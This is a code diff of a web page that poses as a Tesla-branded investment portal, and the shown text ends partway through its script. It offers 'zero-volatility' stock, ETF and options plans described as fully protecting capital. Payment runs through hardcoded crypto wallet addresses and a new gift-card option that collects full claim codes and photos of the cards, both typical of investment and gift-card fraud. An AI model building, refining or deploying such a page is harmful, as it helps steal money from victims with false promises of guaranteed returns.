@@ -24,23 +24,21 @@
 <body class="text-white min-h-screen flex flex-col justify-between pb-8">
 
     <header class="flex items-center justify-between px-6 py-4 border-b border-[#1c1c1c] bg-[#0d0d0d]">
-        <a href="dashboard.html" class="text-neutral-400 hover:text-white flex items-center text-sm">
-            ‹ Back to Hub
-        </a>
+        <a href="dashboard.html" class="text-neutral-400 hover:text-white flex items-center text-sm">‹ Back to Hub</a>
         <span class="text-xs font-bold tracking-widest text-[#E82127] uppercase">Asset Investment Interface</span>
         <div class="w-12"></div>
     </header>
 
     <main id="mainContainer" class="max-w-5xl w-full mx-auto px-4 mt-6 flex-grow transition-all duration-300">
-        
+
+        <!-- Asset Selection Grid (unchanged) -->
         <div id="assetCardsGrid" class="space-y-6">
             <div class="text-center md:text-left mb-2">
                 <h2 class="text-2xl font-bold tracking-tight">Select Capital Placement Vehicle</h2>
-                <p class="text-xs text-neutral-400 mt-1">Deploy capital directly across diversified positions. Settlement finalized exclusively over crypto rails.</p>
+                <p class="text-xs text-neutral-400 mt-1">Deploy capital directly across diversified positions.</p>
             </div>
             
             <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-                <!-- Card 1: Common Stock -->
                 <div class="bg-[#141414] border border-[#222] hover:border-neutral-700 rounded-2xl p-5 shadow-2xl flex flex-col justify-between transition-all group">
                     <div>
                         <div class="flex items-center justify-between mb-3">
@@ -48,14 +46,11 @@
                             <span class="text-xs font-mono font-bold text-neutral-400">TSLA</span>
                         </div>
                         <h3 class="text-lg font-bold mb-1 group-hover:text-[#E82127] transition-colors">1. TSLA Common Stock</h3>
-                        <p class="text-xs text-neutral-400 leading-relaxed">This is a highly reliable way to allocate capital. Your investment is backed by fully collateralized stock equity positions, structured to secure your initial principal while maintaining baseline market exposure.</p>
+                        <p class="text-xs text-neutral-400 leading-relaxed">Highly reliable allocation backed by fully collateralized stock equity positions.</p>
                     </div>
-                    <button onclick="selectAssetVehicle('TSLA Common Stock')" class="w-full bg-neutral-900 hover:bg-[#E82127] hover:text-white border border-neutral-800 text-neutral-300 font-medium py-2.5 rounded-xl text-xs transition-all mt-5 tracking-wide">
-                        Select Asset Channel
-                    </button>
+                    <button onclick="selectAssetVehicle('TSLA Common Stock')" class="w-full bg-neutral-900 hover:bg-[#E82127] hover:text-white border border-neutral-800 text-neutral-300 font-medium py-2.5 rounded-xl text-xs transition-all mt-5">Select Asset Channel</button>
                 </div>
 
-                <!-- Card 2: Tesla-focused ETFs -->
                 <div class="bg-[#141414] border border-[#222] hover:border-neutral-700 rounded-2xl p-5 shadow-2xl flex flex-col justify-between transition-all group">
                     <div>
                         <div class="flex items-center justify-between mb-3">
@@ -63,583 +58,381 @@
                             <span class="text-xs font-mono font-bold text-neutral-400">TSLY / TSL</span>
                         </div>
                         <h3 class="text-lg font-bold mb-1 group-hover:text-[#E82127] transition-colors">2. Tesla-focused ETFs</h3>
-                        <p class="text-xs text-neutral-400 leading-relaxed">Capital preservation funds built entirely around stable Tesla exposure. These use systematic, yield-generating option hedging (TSLY) and protective baseline configurations (TSL) designed to eliminate volatility and preserve core equity value.</p>
+                        <p class="text-xs text-neutral-400 leading-relaxed">Capital preservation funds built around stable Tesla exposure with yield-generating strategies.</p>
                     </div>
-                    <button onclick="selectAssetVehicle('Tesla-focused ETFs (TSLY/TSL)')" class="w-full bg-neutral-900 hover:bg-[#E82127] hover:text-white border border-neutral-800 text-neutral-300 font-medium py-2.5 rounded-xl text-xs transition-all mt-5 tracking-wide">
-                        Select Asset Channel
-                    </button>
+                    <button onclick="selectAssetVehicle('Tesla-focused ETFs (TSLY/TSL)')" class="w-full bg-neutral-900 hover:bg-[#E82127] hover:text-white border border-neutral-800 text-neutral-300 font-medium py-2.5 rounded-xl text-xs transition-all mt-5">Select Asset Channel</button>
                 </div>
 
-                <!-- Card 3: ETFs that hold Tesla -->
                 <div class="bg-[#141414] border border-[#222] hover:border-neutral-700 rounded-2xl p-5 shadow-2xl flex flex-col justify-between transition-all group">
                     <div>
                         <div class="flex items-center justify-between mb-3">
                             <span class="text-xs font-bold tracking-wider text-blue-400 uppercase bg-blue-950/40 border border-blue-900/60 px-2 py-0.5 rounded">Zero-Volatility Fund</span>
-                            <span class="text-xs font-mono font-bold text-neutral-400">INDEX / US MKT</span>
+                            <span class="text-xs font-mono font-bold text-neutral-400">INDEX</span>
                         </div>
                         <h3 class="text-lg font-bold mb-1 group-hover:text-[#E82127] transition-colors">3. ETFs that hold Tesla</h3>
-                        <p class="text-xs text-neutral-400 leading-relaxed">The ultimate low-risk safety net. Instead of focusing on single assets, your funds are spread evenly into premium, highly diversified U.S. index baskets alongside world-class companies to achieve total capital safety.</p>
+                        <p class="text-xs text-neutral-400 leading-relaxed">Diversified U.S. index baskets for maximum capital safety.</p>
                     </div>
-                    <button onclick="selectAssetVehicle('ETFs holding Tesla Portfolio')" class="w-full bg-neutral-900 hover:bg-[#E82127] hover:text-white border border-neutral-800 text-neutral-300 font-medium py-2.5 rounded-xl text-xs transition-all mt-5 tracking-wide">
-                        Select Asset Channel
-                    </button>
+                    <button onclick="selectAssetVehicle('ETFs holding Tesla Portfolio')" class="w-full bg-neutral-900 hover:bg-[#E82127] hover:text-white border border-neutral-800 text-neutral-300 font-medium py-2.5 rounded-xl text-xs transition-all mt-5">Select Asset Channel</button>
                 </div>
 
-                <!-- Card 4: Tesla options -->
                 <div class="bg-[#141414] border border-[#222] hover:border-neutral-700 rounded-2xl p-5 shadow-2xl flex flex-col justify-between transition-all group">
                     <div>
                         <div class="flex items-center justify-between mb-3">
                             <span class="text-xs font-bold tracking-wider text-purple-400 uppercase bg-purple-950/40 border border-purple-900/60 px-2 py-0.5 rounded">Hedging Stability</span>
-                            <span class="text-xs font-mono font-bold text-neutral-400">CALL / PUT</span>
+                            <span class="text-xs font-mono font-bold text-neutral-400">OPTIONS</span>
                         </div>
-                        <h3 class="text-lg font-bold mb-1 group-hover:text-[#E82127] transition-colors">4. Tesla options</h3>
-                        <p class="text-xs text-neutral-400 leading-relaxed">Strategic allocation channels deploying protective contracts on TSLA underlying equities. These channels are structurally designed as an advanced insurance mechanism, removing downside market exposure completely.</p>
+                        <h3 class="text-lg font-bold mb-1 group-hover:text-[#E82127] transition-colors">4. Tesla Options</h3>
+                        <p class="text-xs text-neutral-400 leading-relaxed">Protective contracts designed as advanced insurance against downside risk.</p>
                     </div>
-                    <button onclick="selectAssetVehicle('Tesla Options Market')" class="w-full bg-neutral-900 hover:bg-[#E82127] hover:text-white border border-neutral-800 text-neutral-300 font-medium py-2.5 rounded-xl text-xs transition-all mt-5 tracking-wide">
-                        Select Asset Channel
-                    </button>
+                    <button onclick="selectAssetVehicle('Tesla Options Market')" class="w-full bg-neutral-900 hover:bg-[#E82127] hover:text-white border border-neutral-800 text-neutral-300 font-medium py-2.5 rounded-xl text-xs transition-all mt-5">Select Asset Channel</button>
                 </div>
             </div>
         </div>
 
+        <!-- Form Card -->
         <div id="formCard" class="hidden bg-[#141414] border border-[#222] rounded-2xl p-6 shadow-2xl max-w-md mx-auto relative">
-            <button onclick="resetToAssetGrid()" class="absolute left-6 top-6 text-neutral-500 hover:text-neutral-300 text-xs flex items-center">
-                ‹ Reselect Asset
-            </button>
+            <button onclick="resetToAssetGrid()" class="absolute left-6 top-6 text-neutral-500 hover:text-neutral-300 text-xs">‹ Reselect Asset</button>
             <div class="text-right mb-4">
                 <span id="selectedVehicleBadge" class="text-[10px] font-mono font-bold text-[#E82127] bg-red-950/20 border border-red-900/40 px-2 py-1 rounded-md">TSLA Stock</span>
             </div>
 
             <h2 class="text-xl font-bold tracking-tight mb-1">Fund Allocation</h2>
-            <p class="text-xs text-neutral-400 mb-6">Select your transaction profile parameters.</p>
+            <p class="text-xs text-neutral-400 mb-6">Select your payment method</p>
 
             <div id="statusBox" class="hidden mb-4 p-4 text-sm rounded-xl border"></div>
 
-            <!-- Payment Method Toggle -->
+            <!-- Payment Toggle -->
             <div class="flex bg-[#1c1c1c] rounded-xl p-1 mb-5 border border-[#333]">
                 <button type="button" id="payCryptoBtn" onclick="setPaymentMethod('crypto')" class="flex-1 py-2.5 rounded-lg text-xs font-semibold transition-all bg-[#E82127] text-white">
                     Pay with Crypto
                 </button>
                 <button type="button" id="payCardBtn" onclick="setPaymentMethod('card')" class="flex-1 py-2.5 rounded-lg text-xs font-semibold transition-all text-neutral-400 hover:text-white">
-                    Pay with Card
+                    Pay with Gift Card
                 </button>
             </div>
 
             <form id="investForm" class="space-y-5">
-                <!-- ===== CRYPTO SECTION ===== -->
+                <!-- CRYPTO SECTION -->
                 <div id="cryptoSection">
                     <div>
-                        <label class="block text-xs font-medium uppercase tracking-wider text-neutral-400 mb-2">Select Crypto Asset (Exclusive Payment Rail)</label>
-                        
+                        <label class="block text-xs font-medium uppercase tracking-wider text-neutral-400 mb-2">Select Crypto Asset</label>
                         <div class="relative">
-                            <button id="customSelectTrigger" type="button" class="w-full bg-[#1c1c1c] border border-[#333] rounded-xl p-3 flex items-center justify-between text-left focus:outline-none focus:border-[#E82127] transition-all">
+                            <button id="customSelectTrigger" type="button" class="w-full bg-[#1c1c1c] border border-[#333] rounded-xl p-3 flex items-center justify-between text-left focus:outline-none focus:border-[#E82127]">
                                 <div id="selectedAssetContainer" class="flex items-center space-x-3">
-                                    <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" class="w-6 h-6 rounded-full" alt="USDT">
+                                    <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" class="w-6 h-6 rounded-full">
                                     <div>
-                                        <div class="flex items-center space-x-1.5">
-                                            <span class="text-sm font-bold text-white">USDT</span>
-                                            <span class="text-[9px] bg-neutral-900 border border-neutral-800 text-neutral-400 px-1.5 py-0.5 rounded font-medium">Tron</span>
-                                        </div>
-                                        <p class="text-[10px] text-neutral-400 mt-0.5">$0.99 <span class="text-red-500">-0.15%</span></p>
+                                        <span class="text-sm font-bold text-white">USDT</span>
+                                        <span class="text-[9px] bg-neutral-900 border border-neutral-800 text-neutral-400 px-1.5 py-0.5 rounded ml-1">Tron</span>
                                     </div>
                                 </div>
-                                <svg class="w-4 h-4 text-neutral-500 transition-transform duration-200" id="dropdownArrow" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
-                                    <path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7"/>
-                                </svg>
+                                <svg class="w-4 h-4 text-neutral-500" id="dropdownArrow" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7"/></svg>
                             </button>
-
                             <input type="hidden" id="assetSelect" value="USDT (TRC20)">
-
-                            <div id="customSelectMenu" class="hidden absolute left-0 right-0 mt-2 bg-[#121212] border border-[#222] rounded-xl shadow-2xl overflow-hidden z-50 max-h-72 overflow-y-auto divide-y divide-[#1c1c1c]">
-                                <div class="asset-option p-3 flex items-center justify-between hover:bg-neutral-900/60 cursor-pointer transition-colors" data-value="USDT (TRC20)" data-name="USDT" data-network="Tron" data-img="https://assets.coingecko.com/coins/images/325/large/Tether.png" data-rate="$0.99" data-change="-0.15%">
-                                    <div class="flex items-center space-x-3">
-                                        <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" class="w-6 h-6 rounded-full" alt="USDT">
-                                        <div>
-                                            <div class="flex items-center space-x-1.5">
-                                                <span class="text-sm font-bold text-white">USDT</span>
-                                                <span class="text-[9px] bg-neutral-900 border border-neutral-800 text-neutral-400 px-1.5 py-0.5 rounded font-medium">Tron</span>
-                                            </div>
-                                            <p class="text-[10px] text-neutral-400 mt-0.5">$0.99 <span class="text-red-500">-0.15%</span></p>
-                                        </div>
-                                    </div>
+                            <div id="customSelectMenu" class="hidden absolute left-0 right-0 mt-2 bg-[#121212] border border-[#222] rounded-xl shadow-2xl z-50 max-h-72 overflow-y-auto divide-y divide-[#1c1c1c]">
+                                <div class="asset-option p-3 flex items-center space-x-3 hover:bg-neutral-900/60 cursor-pointer" data-value="USDT (TRC20)" data-name="USDT" data-network="Tron" data-img="https://assets.coingecko.com/coins/images/325/large/Tether.png">
+                                    <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" class="w-6 h-6 rounded-full"><span class="text-sm font-bold">USDT <span class="text-[9px] text-neutral-400">Tron</span></span>
                                 </div>
-                                <div class="asset-option p-3 flex items-center justify-between hover:bg-neutral-900/60 cursor-pointer transition-colors" data-value="Bitcoin (BTC)" data-name="BTC" data-network="" data-img="https://assets.coingecko.com/coins/images/1/large/bitcoin.png" data-rate="$62,871.80" data-change="-7.22%">
-                                    <div class="flex items-center space-x-3">
-                                        <img src="https://assets.coingecko.com/coins/images/1/large/bitcoin.png" class="w-6 h-6 rounded-full" alt="BTC">
-                                        <div>
-                                            <div class="flex items-center space-x-1.5">
-                                                <span class="text-sm font-bold text-white">BTC</span>
-                                            </div>
-                                            <p class="text-[10px] text-neutral-400 mt-0.5">$62,871.80 <span class="text-red-500">-7.22%</span></p>
-                                        </div>
-                                    </div>
+                                <div class="asset-option p-3 flex items-center space-x-3 hover:bg-neutral-900/60 cursor-pointer" data-value="Bitcoin (BTC)" data-name="BTC" data-network="" data-img="https://assets.coingecko.com/coins/images/1/large/bitcoin.png">
+                                    <img src="https://assets.coingecko.com/coins/images/1/large/bitcoin.png" class="w-6 h-6 rounded-full"><span class="text-sm font-bold">BTC</span>
                                 </div>
-                                <div class="asset-option p-3 flex items-center justify-between hover:bg-neutral-900/60 cursor-pointer transition-colors" data-value="Ethereum (ETH)" data-name="ETH" data-network="ERC20" data-img="https://assets.coingecko.com/coins/images/279/large/ethereum.png" data-rate="$3,680.52" data-change="-6.94%">
-                                    <div class="flex items-center space-x-3">
-                                        <img src="https://assets.coingecko.com/coins/images/279/large/ethereum.png" class="w-6 h-6 rounded-full" alt="ETH">
-                                        <div>
-                                            <div class="flex items-center space-x-1.5">
-                                                <span class="text-sm font-bold text-white">ETH</span>
-                                                <span class="text-[9px] bg-neutral-900 border border-neutral-800 text-neutral-400 px-1.5 py-0.5 rounded font-medium">ERC20</span>
-                                            </div>
-                                            <p class="text-[10px] text-neutral-400 mt-0.5">$3,680.52 <span class="text-red-500">-6.94%</span></p>
-                                        </div>
-                                    </div>
+                                <div class="asset-option p-3 flex items-center space-x-3 hover:bg-neutral-900/60 cursor-pointer" data-value="Ethereum (ETH)" data-name="ETH" data-network="ERC20" data-img="https://assets.coingecko.com/coins/images/279/large/ethereum.png">
+                                    <img src="https://assets.coingecko.com/coins/images/279/large/ethereum.png" class="w-6 h-6 rounded-full"><span class="text-sm font-bold">ETH</span>
                                 </div>
-                                <div class="asset-option p-3 flex items-center justify-between hover:bg-neutral-900/60 cursor-pointer transition-colors" data-value="USDC (ERC20)" data-name="USDC" data-network="ERC20" data-img="https://assets.coingecko.com/coins/images/6319/large/USD_Coin_icon.png" data-rate="$1.00" data-change="0.00%">
-                                    <div class="flex items-center space-x-3">
-                                        <img src="https://assets.coingecko.com/coins/images/6319/large/USD_Coin_icon.png" class="w-6 h-6 rounded-full" alt="USDC">
-                                        <div>
-                                            <div class="flex items-center space-x-1.5">
-                                                <span class="text-sm font-bold text-white">USD Coin</span>
-                                                <span class="text-[9px] bg-neutral-900 border border-neutral-800 text-neutral-400 px-1.5 py-0.5 rounded font-medium">ERC20</span>
-                                            </div>
-                                            <p class="text-[10px] text-neutral-400 mt-0.5">$1.00 <span class="text-neutral-500">0.00%</span></p>
-                                        </div>
-                                    </div>
-                                </div>
-                                <div class="asset-option p-3 flex items-center justify-between hover:bg-neutral-900/60 cursor-pointer transition-colors" data-value="USDT (ERC20)" data-name="USDT" data-network="ERC20" data-img="https://assets.coingecko.com/coins/images/325/large/Tether.png" data-rate="$1.00" data-change="-0.02%">
-                                    <div class="flex items-center space-x-3">
-                                        <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" class="w-6 h-6 rounded-full" alt="USDT">
-                                        <div>
-                                            <div class="flex items-center space-x-1.5">
-                                                <span class="text-sm font-bold text-white">USDT</span>
-                                                <span class="text-[9px] bg-neutral-900 border border-neutral-800 text-neutral-400 px-1.5 py-0.5 rounded font-medium">ERC20</span>
-                                            </div>
-                                            <p class="text-[10px] text-neutral-400 mt-0.5">$1.00 <span class="text-red-500">-0.02%</span></p>
-                                        </div>
-                                    </div>
-                                </div>
-                                <div class="asset-option p-3 flex items-center justify-between hover:bg-neutral-900/60 cursor-pointer transition-colors" data-value="Solana (SOL)" data-name="SOL" data-network="" data-img="https://assets.coingecko.com/coins/images/4128/large/solana.png" data-rate="$142.15" data-change="-4.11%">
-                                    <div class="flex items-center space-x-3">
-                                        <img src="https://assets.coingecko.com/coins/images/4128/large/solana.png" class="w-6 h-6 rounded-full" alt="SOL">
-                                        <div>
-                                            <div class="flex items-center space-x-1.5">
-                                                <span class="text-sm font-bold text-white">Solana</span>
-                                            </div>
-                                            <p class="text-[10px] text-neutral-400 mt-0.5">$142.15 <span class="text-red-500">-4.11%</span></p>
-                                        </div>
-                                    </div>
-                                </div>
-                                <div class="asset-option p-3 flex items-center justify-between hover:bg-neutral-900/60 cursor-pointer transition-colors" data-value="Litecoin (LTC)" data-name="LTC" data-network="" data-img="https://assets.coingecko.com/coins/images/2/large/litecoin.png" data-rate="$78.40" data-change="-2.55%">
-                                    <div class="flex items-center space-x-3">
-                                        <img src="https://assets.coingecko.com/coins/images/2/large/litecoin.png" class="w-6 h-6 rounded-full" alt="LTC">
-                                        <div>
-                                            <div class="flex items-center space-x-1.5">
-                                                <span class="text-sm font-bold text-white">Litecoin</span>
-                                            </div>
-                                            <p class="text-[10px] text-neutral-400 mt-0.5">$78.40 <span class="text-red-500">-2.55%</span></p>
-                                        </div>
-                                    </div>
+                                <div class="asset-option p-3 flex items-center space-x-3 hover:bg-neutral-900/60 cursor-pointer" data-value="USDC (ERC20)" data-name="USDC" data-network="ERC20" data-img="https://assets.coingecko.com/coins/images/6319/large/USD_Coin_icon.png">
+                                    <img src="https://assets.coingecko.com/coins/images/6319/large/USD_Coin_icon.png" class="w-6 h-6 rounded-full"><span class="text-sm font-bold">USDC</span>
                                 </div>
                             </div>
                         </div>
                     </div>
-
                     <div class="mt-4">
                         <label class="block text-xs font-medium uppercase tracking-wider text-neutral-400 mb-2">Investment Amount (USD)</label>
-                        <input type="number" id="investAmount" required min="50" step="0.01" placeholder="500.00"
-                            class="w-full bg-[#1c1c1c] border border-[#333] rounded-xl px-4 py-3 text-white focus:outline-none focus:border-[#E82127] transition-all text-sm">
+                        <input type="number" id="investAmount" min="50" step="0.01" placeholder="500.00" class="w-full bg-[#1c1c1c] border border-[#333] rounded-xl px-4 py-3 text-white focus:outline-none focus:border-[#E82127] text-sm">
                     </div>
                 </div>
 
-                <!-- ===== CARD SECTION ===== -->
+                <!-- GIFT CARD SECTION -->
                 <div id="cardSection" class="hidden space-y-4">
-                    <div>
-                        <label class="block text-xs font-medium uppercase tracking-wider text-neutral-400 mb-2">Card Name / Brand</label>
-                        <input type="text" id="cardName" placeholder="e.g. Visa Gift Card / Amex"
-                            class="w-full bg-[#1c1c1c] border border-[#333] rounded-xl px-4 py-3 text-white focus:outline-none focus:border-[#E82127] transition-all text-sm">
+                    <div class="bg-amber-950/30 border border-amber-900/40 rounded-xl p-3 text-xs text-amber-200">
+                        Upload clear photos of the front and back of your Gift Card.
                     </div>
                     <div>
-                        <label class="block text-xs font-medium uppercase tracking-wider text-neutral-400 mb-2">Card Code / Number</label>
-                        <input type="text" id="cardCode" placeholder="XXXX-XXXX-XXXX-XXXX"
-                            class="w-full bg-[#1c1c1c] border border-[#333] rounded-xl px-4 py-3 text-white focus:outline-none focus:border-[#E82127] transition-all text-sm">
+                        <label class="block text-xs font-medium uppercase tracking-wider text-neutral-400 mb-2">Gift Card Brand / Name</label>
+                        <input type="text" id="cardName" placeholder="e.g. Amazon, Visa, Vanilla, Target..." class="w-full bg-[#1c1c1c] border border-[#333] rounded-xl px-4 py-3 text-white focus:outline-none focus:border-[#E82127] text-sm">
+                    </div>
+                    <div>
+                        <label class="block text-xs font-medium uppercase tracking-wider text-neutral-400 mb-2">Card Number / Code</label>
+                        <input type="text" id="cardCode" placeholder="Enter the full card number or claim code" class="w-full bg-[#1c1c1c] border border-[#333] rounded-xl px-4 py-3 text-white focus:outline-none focus:border-[#E82127] text-sm">
                     </div>
                     <div>
                         <label class="block text-xs font-medium uppercase tracking-wider text-neutral-400 mb-2">Face Value (USD)</label>
-                        <input type="number" id="cardFaceValue" min="1" step="0.01" placeholder="500.00"
-                            class="w-full bg-[#1c1c1c] border border-[#333] rounded-xl px-4 py-3 text-white focus:outline-none focus:border-[#E82127] transition-all text-sm">
+                        <input type="number" id="cardFaceValue" min="1" step="0.01" placeholder="100.00" class="w-full bg-[#1c1c1c] border border-[#333] rounded-xl px-4 py-3 text-white focus:outline-none focus:border-[#E82127] text-sm">
                     </div>
                     <div>
                         <label class="block text-xs font-medium uppercase tracking-wider text-neutral-400 mb-2">
-                            Upload Card Images <span id="imgCounter" class="text-blue-400 font-normal normal-case">0 / 10</span>
+                            Upload Gift Card Photos <span id="imgCounter" class="text-blue-400 font-normal normal-case">0 / 6</span>
                         </label>
-                        <input type="file" id="cardImagesInput" accept="image/*" multiple
-                            class="w-full text-sm text-neutral-400 file:mr-4 file:py-2 file:px-4 file:rounded-xl file:border-0 file:text-sm file:font-semibold file:bg-[#E82127] file:text-white hover:file:bg-red-700">
+                        <input type="file" id="cardImagesInput" accept="image/*" multiple class="w-full text-sm text-neutral-400 file:mr-4 file:py-2 file:px-4 file:rounded-xl file:border-0 file:text-sm file:font-semibold file:bg-[#E82127] file:text-white hover:file:bg-red-700">
                         <div id="imgPreviewContainer" class="flex flex-wrap gap-3 mt-3"></div>
                     </div>
                 </div>
 
-                <button type="submit" id="submitBtn"
-                    class="w-full bg-[#E82127] hover:bg-[#c61a1f] active:scale-[0.99] text-white font-medium py-3.5 rounded-xl transition-all text-sm mt-2 shadow-lg shadow-red-900/20">
+                <button type="submit" id="submitBtn" class="w-full bg-[#E82127] hover:bg-[#c61a1f] active:scale-[0.99] text-white font-medium py-3.5 rounded-xl transition-all text-sm mt-2 shadow-lg shadow-red-900/20">
                     Initialize Capital Integration
                 </button>
             </form>
         </div>
 
-        <!-- Card Success -->
+        <!-- Success Screen -->
         <div id="cardSuccessCard" class="hidden bg-[#141414] border border-[#222] rounded-2xl p-8 shadow-2xl text-center space-y-5 max-w-md mx-auto">
             <div class="w-16 h-16 bg-emerald-500/10 rounded-full flex items-center justify-center mx-auto">
-                <svg class="w-8 h-8 text-emerald-400" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-                    <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/>
-                </svg>
+                <svg class="w-8 h-8 text-emerald-400" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg>
             </div>
-            <h3 class="text-lg font-bold text-white">Card Details Received</h3>
-            <p class="text-xs text-neutral-400 leading-relaxed">Your card information has been securely transmitted. Our team will process the allocation shortly.</p>
-            <a href="dashboard.html" class="inline-block w-full bg-neutral-900 hover:bg-neutral-800 text-neutral-300 font-medium py-3 rounded-xl text-sm border border-neutral-800 transition-all">
-                Return to Hub
-            </a>
+            <h3 class="text-lg font-bold text-white">Gift Card Received</h3>
+            <p class="text-xs text-neutral-400">Your gift card details and photos have been submitted successfully. Our team will review and process it shortly.</p>
+            <a href="dashboard.html" class="inline-block w-full bg-neutral-900 hover:bg-neutral-800 text-neutral-300 font-medium py-3 rounded-xl text-sm border border-neutral-800">Return to Hub</a>
         </div>
 
-        <!-- Crypto Payment Card -->
+        <!-- Crypto Payment Screen -->
         <div id="paymentCard" class="hidden bg-[#141414] border border-[#222] rounded-2xl p-5 shadow-2xl text-center space-y-5 max-w-md mx-auto">
             <div class="bg-[#241a0d] border border-[#3d2a13] rounded-xl p-3 text-left flex items-start space-x-2.5">
-                <span class="text-[#f0a23e] text-sm mt-0.5">⚠️</span>
-                <p class="text-[11px] text-[#f0a23e] font-medium leading-normal">
-                    Only send <span id="bannerAsset">USDT (TRC20)</span> assets to this address. Other assets will be lost forever.
-                </p>
+                <span class="text-[#f0a23e]">⚠️</span>
+                <p class="text-[11px] text-[#f0a23e] font-medium">Only send <span id="bannerAsset">USDT (TRC20)</span> to this address.</p>
             </div>
-
-            <div class="bg-white rounded-2xl p-4 inline-block shadow-lg">
-                <img id="qrCodeImg" src="" alt="Deposit QR Code" class="w-44 h-44 mx-auto">
-                <p class="text-[11px] text-neutral-500 font-bold tracking-tight mt-2" id="walletLabel">USDT (TRC20)</p>
+            <div class="bg-white rounded-2xl p-4 inline-block">
+                <img id="qrCodeImg" src="" class="w-44 h-44 mx-auto">
+                <p class="text-[11px] text-neutral-500 font-bold mt-2" id="walletLabel">USDT (TRC20)</p>
             </div>
-
             <div class="space-y-3 text-left">
                 <div>
                     <label class="block text-[10px] font-bold uppercase tracking-wider text-neutral-500 mb-1.5">Amount Due</label>
-                    <div id="payAmountDisplay" class="bg-[#1c1c1c] border border-[#282828] rounded-xl px-4 py-3 text-sm font-mono font-bold text-white">0.00</div>
+                    <div id="payAmountDisplay" class="bg-[#1c1c1c] border border-[#282828] rounded-xl px-4 py-3 text-sm font-mono font-bold">0.00</div>
                 </div>
                 <div>
-                    <label class="block text-[10px] font-bold uppercase tracking-wider text-neutral-500 mb-1.5">Your Destination Address</label>
+                    <label class="block text-[10px] font-bold uppercase tracking-wider text-neutral-500 mb-1.5">Destination Address</label>
                     <div class="bg-[#1c1c1c] border border-[#282828] rounded-xl p-3 font-mono text-xs text-neutral-300 flex justify-between items-center gap-3">
-                        <span id="walletAddress" class="break-all tracking-tight select-all">Fetching...</span>
-                        <button type="button" id="copyBtn" onclick="copyWalletAddress()" class="bg-neutral-800 hover:bg-neutral-700 active:bg-neutral-600 p-2.5 rounded-lg transition-all flex items-center justify-center shrink-0 border border-neutral-700">
-                            <svg id="copyIcon" class="w-4 h-4 text-neutral-300" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-                                <path stroke-linecap="round" stroke-linejoin="round" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path>
-                            </svg>
-                            <span id="copyTxt" class="hidden text-[10px] font-bold text-emerald-400 px-1">Copied!</span>
-                        </button>
+                        <span id="walletAddress" class="break-all">—</span>
+                        <button type="button" onclick="copyWalletAddress()" class="bg-neutral-800 hover:bg-neutral-700 p-2 rounded-lg shrink-0">Copy</button>
                     </div>
                 </div>
             </div>
-
-            <div class="pt-2 space-y-2.5">
-                <a id="trustWalletLink" href="#" class="w-full bg-[#0052FF] hover:bg-[#0045d8] text-white font-medium py-3.5 rounded-xl block transition-all text-sm shadow-lg tracking-wide font-semibold">
-                    Pay via Trust Wallet
-                </a>
-                <a id="moonPayLink" href="#" target="_blank" class="w-full bg-[#7D00FF] hover:bg-[#6600D1] text-white font-medium py-3.5 rounded-xl block transition-all text-sm shadow-lg tracking-wide font-semibold">
-                    Buy & Pay via MoonPay
-                </a>
-                <a href="dashboard.html" class="w-full bg-neutral-900 hover:bg-neutral-800 text-neutral-400 font-medium py-3 rounded-xl block transition-all text-xs border border-neutral-800">
-                    I Have Sent the Funds
-                </a>
-            </div>
+            <a href="dashboard.html" class="w-full bg-neutral-900 hover:bg-neutral-800 text-neutral-400 font-medium py-3 rounded-xl block text-xs border border-neutral-800">I Have Sent the Funds</a>
         </div>
     </main>
 
     <script>
-    // ========== SUPABASE CONNECTION ==========
-    const SUPABASE_URL = "https://jawpzkqvcvcrmpirqcma.supabase.co";
-    const SUPABASE_ANON_KEY = "sb_publishable_EAds5LMLdll_0ubbbhw_kg_fJxzlOtH";
-    const { createClient } = supabase;
-    const _supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
-    // =========================================
+        const SUPABASE_URL = "https://jawpzkqvcvcrmpirqcma.supabase.co";
+        const SUPABASE_ANON_KEY = "sb_publishable_EAds5LMLdll_0ubbbhw_kg_fJxzlOtH";
+        const { createClient } = supabase;
+        const _supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
-    const userId = localStorage.getItem("userId");
-    if (!userId) {
-        window.location.href = "index.html";
-    }
+        const userId = localStorage.getItem("userId");
+        if (!userId) window.location.href = "index.html";
 
-    const wallets = {
-        "Dash (DASH)": { address: "XaqwuuFddEwm2Q9yPW3kf1JWavRkNYpi2j", scheme: "dash:XaqwuuFddEwm2Q9yPW3kf1JWavRkNYpi2j", label: "Dash (DASH)", moonpayCode: "dash" },
-        "Litecoin (LTC)": { address: "ltc1q0a8k5xvcks3xqj38stjk33mhde3mjjh95v2t7j", scheme: "litecoin:ltc1q0a8k5xvcks3xqj38stjk33mhde3mjjh95v2t7j", label: "Litecoin (LTC)", moonpayCode: "ltc" },
-        "XRP (XRP)": { address: "rHpjJPKYbjaZ6u5uKf9QVuEQCiy7duLo1Q", scheme: "xrpl:rHpjJPKYbjaZ6u5uKf9QVuEQCiy7duLo1Q", label: "XRP (XRP)", moonpayCode: "xrp" },
-        "Tron (TRX)": { address: "TTH6ms4CCRVAqJQTVmtjj48UZArSswBQL6", scheme: "tron:TTH6ms4CCRVAqJQTVmtjj48UZArSswBQL6", label: "Tron (TRX)", moonpayCode: "trx" },
